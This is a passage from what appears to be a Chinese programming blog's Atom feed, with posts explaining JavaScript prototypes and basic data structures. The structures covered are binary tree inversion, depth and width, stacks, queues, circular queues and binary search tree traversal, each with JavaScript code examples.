这个问题了。因为先有的 <code>Function.prototype</code> 以后才有的 <code>function Function()</code> ，所以也就不存在鸡生蛋蛋生鸡的悖论问题了。</p><p>对于为什么 <code>Function.__proto__</code> 会等于 <code>Function.prototype</code> ，个人的理解是：其他所有的构造函数都可以通过原型链找到 <code>Function.prototype</code> ，并且 <code>function Function()</code> 本质也是一个函数，为了不产生混乱就将 <code>function Function()</code> 的 <code>__proto__</code> 联系到了 <code>Function.prototype</code> 上。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><code>Object</code> 是所有对象的爸爸，所有对象都可以通过 <code>__proto__</code> 找到它</li><li><code>Function</code> 是所有函数的爸爸，所有函数都可以通过 <code>__proto__</code> 找到它</li><li><code>Function.prototype</code> 和 <code>Object.prototype</code> 是两个特殊的对象，他们由引擎来创建</li><li>除了以上两个特殊对象，其他对象都是通过构造器 <code>new</code> 出来的</li><li>函数的 <code>prototype</code> 是一个对象，也就是原型</li><li>对象的 <code>__proto__</code> 指向原型， <code>__proto__</code> 将对象和原型连接起来组成了原型链</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一、prototype&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1、&lt;code&gt;prototype&lt;/code&gt; 是一个显式原型属性，只有函数才拥有该属性。基本上所有函数都有这个属性，但是也有一个例外:&lt;/p&gt;
&lt;p&gt; &lt;code&gt;let fun = Function.prototype.bind()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你以上述方法创建一个函数，那么可以发现这个函数是不具有 prototype 属性的。&lt;/p&gt;
&lt;p&gt;2、当我们声明一个函数时，这个属性就被自动创建了。 &lt;code&gt;function Foo() {}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;并且这个属性的值是一个对象（也就是原型），只有一个属性 &lt;code&gt;constructor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;constructor&lt;/code&gt; 对应着构造函数，也就是 &lt;code&gt;Foo&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;3、&lt;code&gt;constructor&lt;/code&gt;是一个公有且不可枚举的属性。一旦我们改变了函数的 &lt;code&gt;prototype&lt;/code&gt; ，那么新对象就没有这个属性了（当然可以通过原型链取到 &lt;code&gt;constructor&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;constructor&lt;/code&gt;属性到底有什么用呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;让实例对象知道是什么函数构造了它&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果想给某些类库中的构造函数增加一些自定义的方法，就可以通过 xx.constructor.method 来扩展&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基本的数据结构</title>
    <link href="wangsiyuan233.github.io/2018/07/25/64%E5%9F%BA%E6%9C%AC%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <id>wangsiyuan233.github.io/2018/07/25/64基本的数据结构/</id>
    <published>2018-07-25T08:30:40.000Z</published>
    <updated>2018-10-06T10:54:25.208Z</updated>
    
    <content type="html"><![CDATA[<p>来源于 <a href="https://leetcode.com/problems/invert-binary-tree/description/" target="_blank" rel="external">LeetCode - 226</a></p><blockquote><p>一、翻转二叉树</p></blockquote><p><img src="https://i.imgur.com/gIjXNsQ.png" alt=""><br>其实思路还是比较简单的：将当前的root节点的左右分支进行对调反转，若左分支存在，则将左分支的节点作为root节点进行对调反转；若右分支存在，则将右分支的节点作为root节点进行对调反转；一直 <strong>递归</strong> 到所有节点的左右分支都不存在。<br><a id="more"></a><br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Definition for a binary tree node.</div><div class="line"> * function TreeNode(val) &#123;</div><div class="line"> *     this.val = val;</div><div class="line"> *     this.left = this.right = null;</div><div class="line"> * &#125;</div><div class="line"> */</div><div class="line"><span class="comment">/**</span></div><div class="line"> * @param &#123;TreeNode&#125; root</div><div class="line"> * @return &#123;TreeNode&#125;</div><div class="line"> */</div><div class="line"><span class="keyword">var</span> invertTree = function(root) &#123;</div><div class="line">    <span class="comment">// 传入的根节点可能就是null或者异常节点，则对root进行判断</span></div><div class="line">    <span class="keyword">if</span>(root)&#123;</div><div class="line">        <span class="keyword">var</span> temp = null;</div><div class="line"></div><div class="line">        <span class="comment">// 将当前节点的左右分支进行对调反转</span></div><div class="line">        temp = root.<span class="keyword">left</span>;</div><div class="line">        root.<span class="keyword">left</span> = root.<span class="keyword">right</span>;</div><div class="line">        root.<span class="keyword">right</span> = temp;</div><div class="line"></div><div class="line">        <span class="comment">// 若左分支存在，则递归左分支的节点</span></div><div class="line">        <span class="keyword">if</span>(root.<span class="keyword">left</span>)&#123;</div><div class="line">            invertTree(root.<span class="keyword">left</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 若右分支存在，则递归右分支的节点</span></div><div class="line">        <span class="keyword">if</span>(root.<span class="keyword">right</span>)&#123;</div><div class="line">            invertTree(root.<span class="keyword">right</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 所有的节点遍历完成后，返回根节点</span></div><div class="line">    <span class="keyword">return</span> root;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><blockquote><p>二、求二叉树的深度</p></blockquote><ul><li>只有一个根结点时，二叉树深度为1</li><li>只有左子树时，二叉树深度为左子树深度加1</li><li>只有右子树时，二叉树深度为右子树深度加1</li><li>同时存在左右子树时，二叉树深度为左右子树中深度最大者加1<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep</span><span class="params">(root)</span>&#123;</span></div><div class="line">    <span class="keyword">if</span>(!root)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">let</span> <span class="keyword">left</span> = deep(root.<span class="keyword">left</span>)</div><div class="line">    <span class="keyword">let</span> <span class="keyword">right</span> = deep(root.<span class="keyword">right</span>)</div><div class="line">    <span class="keyword">return</span> <span class="keyword">left</span> &gt; <span class="keyword">right</span> ? <span class="keyword">left</span> + <span class="number">1</span> : <span class="keyword">right</span> + <span class="number">1</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><blockquote><p>三、求二叉树的宽度</p></blockquote><ul><li>算出第一层的结点数，保存</li><li>算出第二层的结点数，保存一二层中较大的结点数</li><li>重复以上过程<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">width</span><span class="params">(root)</span>&#123;</span></div><div class="line">    <span class="keyword">if</span>(!root)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">let</span> queue = [root], <span class="built_in">max</span> = <span class="number">1</span>, deep = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span>(queue.length)&#123;</div><div class="line">        <span class="keyword">while</span>(deep--)&#123;</div><div class="line">            <span class="keyword">let</span> temp = queue.shift()</div><div class="line">            <span class="keyword">if</span>(temp.<span class="keyword">left</span>)&#123;</div><div class="line">                queue.push(temp.<span class="keyword">left</span>)</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(temp.<span class="keyword">right</span>)&#123;</div><div class="line">                queue.push(temp.<span class="keyword">right</span>)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        deep = queue.length</div><div class="line">        <span class="built_in">max</span> = <span class="built_in">max</span> &gt; deep ? <span class="built_in">max</span> : deep</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">max</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><p>栈是一个线性结构</p><p>栈的特点是只能在<strong>某一端</strong>添加或删除数据，遵循<strong>先进后出</strong>的原则<br><!--more--><br><img src="https://i.imgur.com/UcwdXxz.png" alt=""><br>把栈看成是数组的一个子集:<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.stack = []</div><div class="line">  &#125;</div><div class="line">  push(item) &#123;</div><div class="line">    <span class="keyword">this</span>.stack.push(item)</div><div class="line">  &#125;</div><div class="line">  pop() &#123;</div><div class="line">    <span class="keyword">this</span>.stack.pop()</div><div class="line">  &#125;</div><div class="line">  peek() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.stack[<span class="keyword">this</span>.getCount() - <span class="number">1</span>]</div><div class="line">  &#125;</div><div class="line">  getCount() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.stack.length</div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getCount() === <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>应用题<br>题目：<a href="https://leetcode.com/problems/valid-parentheses/description/" target="_blank" rel="external">Valid Parentheses</a><br>匹配括号，可以用栈来做<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">var</span> isValid = function (s) &#123;</div><div class="line">  <span class="built_in">let</span> <span class="built_in">map</span> = &#123;</div><div class="line">    '(': -<span class="number">1</span>,</div><div class="line">    ')': <span class="number">1</span>,</div><div class="line">    '[': -<span class="number">2</span>,</div><div class="line">    ']': <span class="number">2</span>,</div><div class="line">    '&#123;': -<span class="number">3</span>,</div><div class="line">    '&#125;': <span class="number">3</span></div><div class="line">  &#125;</div><div class="line">  <span class="built_in">let</span> stack = []</div><div class="line">  <span class="keyword">for</span> (<span class="built_in">let</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>; i++) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="built_in">map</span>[s[i]] &lt; <span class="number">0</span>) &#123;</div><div class="line">      stack.<span class="built_in">push</span>(s[i])</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      <span class="built_in">let</span> <span class="built_in">last</span> = stack.<span class="built_in">pop</span>()</div><div class="line">      <span class="keyword">if</span> (<span class="built_in">map</span>[<span class="built_in">last</span>] + <span class="built_in">map</span>[s[i]] != <span class="number">0</span>) <span class="built_in">return</span> <span class="literal">false</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (stack.<span class="built_in">length</span> &gt; <span class="number">0</span>) <span class="built_in">return</span> <span class="literal">false</span></div><div class="line">  <span class="built_in">return</span> <span class="literal">true</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><h2 id="★30s总结"><a href="#★30s总结" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>记住图，先进后出</li></ul><hr><p>队列一个线性结构，特点是在某一端添加数据，在另一端删除数据，遵循<strong>先进先出</strong>的原则。<br><!--more--><br><img src="https://i.imgur.com/t7QNGSm.png" alt=""></p><blockquote><p>一、 单链队列 </p></blockquote><p>因为单链队列在出队操作的时候需要 O(n) 的时间复杂度，所以引入了循环队列。循环队列的出队操作平均是 O(1) 的时间复杂度。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.queue = []</div><div class="line">  &#125;</div><div class="line">  enQueue(item) &#123;</div><div class="line">    <span class="keyword">this</span>.queue.push(item)</div><div class="line">  &#125;</div><div class="line">  deQueue() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue.shift()</div><div class="line">  &#125;</div><div class="line">  getHeader() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue[<span class="number">0</span>]</div><div class="line">  &#125;</div><div class="line">  getLength() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue.length</div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getLength() === <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>二、循环队列</p></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqQueue</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(length) &#123;</div><div class="line">    <span class="keyword">this</span>.queue = new Array(length + <span class="number">1</span>)</div><div class="line">    <span class="comment">// 队头</span></div><div class="line">    <span class="keyword">this</span>.first = <span class="number">0</span></div><div class="line">    <span class="comment">// 队尾</span></div><div class="line">    <span class="keyword">this</span>.last = <span class="number">0</span></div><div class="line">    <span class="comment">// 当前队列大小</span></div><div class="line">    <span class="keyword">this</span>.size = <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">  enQueue(item) &#123;</div><div class="line">    <span class="comment">// 判断队尾 + 1 是否为队头</span></div><div class="line">    <span class="comment">// 如果是就代表需要扩容数组</span></div><div class="line">    <span class="comment">// % this.queue.length 是为了防止数组越界</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.first === (<span class="keyword">this</span>.last + <span class="number">1</span>) % <span class="keyword">this</span>.queue.length) &#123;</div><div class="line">      <span class="keyword">this</span>.resize(<span class="keyword">this</span>.getLength() * <span class="number">2</span> + <span class="number">1</span>)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.queue[<span class="keyword">this</span>.last] = item</div><div class="line">    <span class="keyword">this</span>.size++</div><div class="line">    <span class="keyword">this</span>.last = (<span class="keyword">this</span>.last + <span class="number">1</span>) % <span class="keyword">this</span>.queue.length</div><div class="line">  &#125;</div><div class="line">  deQueue() &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEmpty()) &#123;</div><div class="line">      <span class="keyword">throw</span> Error(<span class="string">'Queue is empty'</span>)</div><div class="line">    &#125;</div><div class="line">    let r = <span class="keyword">this</span>.queue[<span class="keyword">this</span>.first]</div><div class="line">    <span class="keyword">this</span>.queue[<span class="keyword">this</span>.first] = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.first = (<span class="keyword">this</span>.first + <span class="number">1</span>) % <span class="keyword">this</span>.queue.length</div><div class="line">    <span class="keyword">this</span>.size--</div><div class="line">    <span class="comment">// 判断当前队列大小是否过小</span></div><div class="line">    <span class="comment">// 为了保证不浪费空间，在队列空间等于总长度四分之一时</span></div><div class="line">    <span class="comment">// 且不为 2 时缩小总长度为当前的一半</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.size === <span class="keyword">this</span>.getLength() / <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.getLength() / <span class="number">2</span> !== <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">this</span>.resize(<span class="keyword">this</span>.getLength() / <span class="number">2</span>)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> r</div><div class="line">  &#125;</div><div class="line">  getHeader() &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEmpty()) &#123;</div><div class="line">      <span class="keyword">throw</span> Error(<span class="string">'Queue is empty'</span>)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue[<span class="keyword">this</span>.first]</div><div class="line">  &#125;</div><div class="line">  getLength() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue.length - <span class="number">1</span></div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.first === <span class="keyword">this</span>.last</div><div class="line">  &#125;</div><div class="line">  resize(length) &#123;</div><div class="line">    let q = new Array(length)</div><div class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; length; i++) &#123;</div><div class="line">      q[i] = <span class="keyword">this</span>.queue[(i + <span class="keyword">this</span>.first) % <span class="keyword">this</span>.queue.length]</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">this</span>.queue = q</div><div class="line">    <span class="keyword">this</span>.first = <span class="number">0</span></div><div class="line">    <span class="keyword">this</span>.last = <span class="keyword">this</span>.size</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="★30s总结-1"><a href="#★30s总结-1" class="headerlink" title="★30s总结"></a>★30s总结</h2><ul><li>记住图，先进先出</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;来源于 &lt;a href=&quot;https://leetcode.com/problems/invert-binary-tree/description/&quot;&gt;LeetCode - 226&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、翻转二叉树&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gIjXNsQ.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;其实思路还是比较简单的：将当前的root节点的左右分支进行对调反转，若左分支存在，则将左分支的节点作为root节点进行对调反转；若右分支存在，则将右分支的节点作为root节点进行对调反转；一直 &lt;strong&gt;递归&lt;/strong&gt; 到所有节点的左右分支都不存在。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>二分查找（binary search）</title>
    <link href="wangsiyuan233.github.io/2018/07/24/63%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    <id>wangsiyuan233.github.io/2018/07/24/63二分查找/</id>
    <published>2018-07-24T02:02:34.000Z</published>
    <updated>2018-07-26T17:20:13.487Z</updated>
    
    <content type="html"><![CDATA[<p>树拥有很多种结构，二叉树是树中最常用的结构，同时也是一个天然的递归结构。</p><p>二分查找树也是二叉树，拥有二叉树的特性。但是区别在于二分查找树每个节点的值都<strong>比他的左子树的值大</strong>，<strong>比右子树的值小</strong>。</p><blockquote><p>一、创建一颗最简单的树</p></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(value) &#123;</div><div class="line">    <span class="keyword">this</span>.value = value</div><div class="line">    <span class="keyword">this</span>.left = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.right = <span class="literal">null</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BST</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.size = <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">  getSize() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.size</div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.size === <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">  addNode(v) &#123;</div><div class="line">    <span class="keyword">this</span>.root = <span class="keyword">this</span>._addChild(<span class="keyword">this</span>.root, v)</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 添加节点时，需要比较添加的节点值和当前</span></div><div class="line">  <span class="comment">// 节点值的大小</span></div><div class="line">  _addChild(node, v) &#123;</div><div class="line">    <span class="keyword">if</span> (!node) &#123;</div><div class="line">      <span class="keyword">this</span>.size++</div><div class="line">      <span class="keyword">return</span> new Node(v)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (node.value &gt; v) &#123;</div><div class="line">      node.left = <span class="keyword">this</span>._addChild(node.left, v)</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.value &lt; v) &#123;</div><div class="line">      node.right = <span class="keyword">this</span>._addChild(node.right, v)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> node</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a><blockquote><p>二、树的遍历</p></blockquote><p>1、深度遍历</p><p>对于树的遍历来说，有三种遍历方法，分别是先序遍历、中序遍历、后序遍历。三种遍历的区别在于何时访问节点。在遍历树的过程中，每个节点都会遍历三次，分别是遍历到自己，遍历左子树和遍历右子树。如果需要实现先序遍历，那么只需要第一次遍历到节点时进行操作即可。</p><p>以下都是递归实现：</p><p>1.1、先序遍历<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">// 先序遍历可用于打印树的结构</div><div class="line">// 先序遍历先访问根节点，然后访问左节点，最后访问右节点。</div><div class="line">preTraversal() &#123;</div><div class="line">  this._pre(this.root)</div><div class="line">&#125;</div><div class="line">_pre(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">    console.log(<span class="keyword">node</span>.<span class="title">value</span>)</div><div class="line">    this._pre(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">    this._pre(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>1.2、中序遍历<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">// 中序遍历可用于排序</div><div class="line">// 对于 BST 来说，中序遍历可以实现一次遍历就</div><div class="line">// 得到有序的值</div><div class="line">// 中序遍历表示先访问左节点，然后访问根节点，最后访问右节点。</div><div class="line">midTraversal() &#123;</div><div class="line">  this._mid(this.root)</div><div class="line">&#125;</div><div class="line">_mid(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">    this._mid(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">    console.log(<span class="keyword">node</span>.<span class="title">value</span>)</div><div class="line">    this._mid(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>1.3、后序遍历<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">// 后序遍历可用于先操作子节点</div><div class="line">// 再操作父节点的场景</div><div class="line">// 后序遍历表示先访问左节点，然后访问右节点，最后访问根节点。</div><div class="line">backTraversal() &#123;</div><div class="line">  this._back(this.root)</div><div class="line">&#125;</div><div class="line">_back(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">    this._back(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">    this._back(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">    console.log(<span class="keyword">node</span>.<span class="title">value</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>2、广度遍历<br>也就是一层层地遍历树。对于广度遍历来说，我们需要利用 队列结构 来完成。<br><figure class="highlight pony"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">breadthTraversal() &#123;</div><div class="line">  <span class="keyword">if</span> (!<span class="literal">this</span>.root) <span class="keyword">return</span> null</div><div class="line">  <span class="keyword">let</span> q = <span class="function"><span class="keyword">new</span> <span class="title">Queue</span>()</span></div><div class="line">  <span class="comment">// 将根节点入队</span></div><div class="line">  <span class="title">q</span>.<span class="title">enQueue</span>(this.root)</div><div class="line">  <span class="comment">// 循环判断队列是否为空，为空</span></div><div class="line">  <span class="comment">// 代表树遍历完毕</span></div><div class="line">  <span class="title">while</span> (!q.isEmpty()) &#123;</div><div class="line">    <span class="comment">// 将队首出队，判断是否有左右子树</span></div><div class="line">    <span class="comment">// 有的话，就先左后右入队</span></div><div class="line">    <span class="title">let</span> <span class="title">n</span> = <span class="title">q</span>.<span class="title">deQueue</span>()</div><div class="line">    <span class="title">console</span>.<span class="title">log</span>(n.value)</div><div class="line">    <span class="title">if</span> (n.left) <span class="title">q</span>.<span class="title">enQueue</span>(n.left)</div><div class="line">    <span class="title">if</span> (n.right) <span class="title">q</span>.<span class="title">enQueue</span>(n.right)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>三、寻找最值</p></blockquote><p>第一步：因为二分查找树的特性，所以最小值一定在根节点的最左边，最大值相反<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div 